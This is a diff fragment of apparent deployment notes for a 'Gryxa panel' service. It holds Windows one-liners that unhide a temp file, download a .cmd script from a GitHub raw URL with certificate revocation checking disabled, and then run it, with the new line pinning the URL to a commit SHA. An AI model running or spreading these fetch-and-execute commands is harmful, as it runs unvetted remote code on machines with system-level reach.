@@ -3,7 +3,7 @@ UNIVERSAL DEPLOY (O39 / M29 / L16 — stop Gryxa panel duplicates):
 attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o39" & findstr /C:"OWN BUILD 20260802O39" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
 SHA-pin:
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/SHA/own.txt" & findstr /C:"OWN BUILD 20260802O39" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/a9d367ab3ba6677b6a90c77c4c7bbdba01b55c57/own.txt" & findstr /C:"OWN BUILD 20260802O39" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
 O39 fix (duplicates):
 - HARD RULE: if Gryxa service is Running → never msiexec /x or /i.
